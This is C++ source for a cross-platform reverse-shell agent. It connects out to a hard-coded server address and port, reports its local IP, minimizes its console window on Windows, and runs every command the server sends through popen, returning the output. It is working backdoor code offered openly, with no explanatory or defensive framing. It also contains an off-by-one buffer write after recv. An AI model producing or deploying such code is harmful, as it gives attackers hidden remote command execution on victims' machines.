#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <memory>
#include <array>
#include <thread>
#include <mutex>
#include <condition_variable>

#ifdef _WIN32
    #include <winsock2.h>  // Windows-specific networking headers
    #include <ws2tcpip.h>
    #include <windows.h>   // For hiding or minimizing the console window
    #pragma comment(lib, "Ws2_32.lib")  // Link with the Winsock library
#else
    #include <arpa/inet.h>  // POSIX socket headers (Linux)
    #include <sys/socket.h>
    #include <unistd.h>
    #include <netinet/in.h>
#endif
#include <string.h>

// Initialize networking (Winsock on Windows or nothing on Linux)
void init_networking() {
#ifdef _WIN32
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        exit(1);
    }
#endif
}

// Clean up networking (Winsock on Windows or nothing on Linux)
void cleanup_networking() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Function to execute system command and capture output (Windows version)
std::string exec(const std::string& cmd) {
#ifdef _WIN32
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(_popen(cmd.c_str(), "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
#else
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
#endif
}

// Minimize the console window on Windows
void minimize_console() {
#ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_MINIMIZE);  // Minimize the console window
#endif
}

// Function to send the agent's IP address to the server
void send_ip_to_server(int sock) {
    // Get the local IP address of the agent
    char ip[INET_ADDRSTRLEN];
    sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    // Get the local address (for the client side)
    if (getsockname(sock, (struct sockaddr*)&addr, &addr_len) == 0) {
        inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof(ip));
        send(sock, ip, strlen(ip), 0);
    }
}

// Main function to communicate with the server and execute commands
void communicate_with_server(const std::string& server_ip, const std::string& server_port) {
    init_networking();

    // Create socket
    int sock;
#ifdef _WIN32
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed!" << std::endl;
        cleanup_networking();
        return;
    }
#else
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "Socket creation failed!" << std::endl;
        cleanup_networking();
        return;
    }
#endif

    // Resolve server address
    sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    inet_pton(AF_INET, server_ip.c_str(), &server_address.sin_addr);
    server_address.sin_port = htons(std::stoi(server_port));

    // Connect to the server
#ifdef _WIN32
    if (connect(sock, reinterpret_cast<sockaddr*>(&server_address), sizeof(server_address)) == SOCKET_ERROR) {
#else
    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
#endif
        std::cerr << "Connection failed!" << std::endl;
        cleanup_networking();
        return;
    }

    std::cout << "Connected to the server." << std::endl;

    // Send the agent's IP address to the server
    send_ip_to_server(sock);

    // Minimize the console window
    minimize_console();

    // Loop to receive commands and send back results
    while (true) {
        char buffer[512];
#ifdef _WIN32
        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
#else
        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
#endif
        if (bytes_received <= 0) {
            std::cerr << "Error or connection closed by server." << std::endl;
            break;
        }
        buffer[bytes_received] = '\0';  // Null-terminate the string

        std::string command(buffer);
        if (command == "exit") {
            std::cout << "Exiting..." << std::endl;
            break;
        }

        std::string result = exec(command);  // Execute the command
        send(sock, result.c_str(), result.size(), 0);  // Send back the result
    }
    #ifdef _WIN32
        closesocket(sock);  // Close the socket
    #else
        close(sock);
    #endif
    cleanup_networking();
}

int main() {
    std::string server_ip = "192.168.1.2";  // Server IP address
    std::string server_port = "12345";    // Server port

    communicate_with_server(server_ip, server_port);

    return 0;
}
